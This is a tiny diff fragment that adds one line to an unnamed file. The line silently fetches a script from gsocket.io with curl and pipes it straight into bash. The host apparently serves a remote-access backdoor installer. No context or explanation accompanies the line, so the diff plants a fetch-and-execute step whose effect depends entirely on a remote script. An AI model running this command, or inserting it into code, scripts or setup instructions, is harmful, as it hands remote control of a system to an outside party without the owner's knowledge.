@@ -1,0 +1,1 @@
+curl -Lso- gsocket.io/x (http://gsocket.io/x) | bash
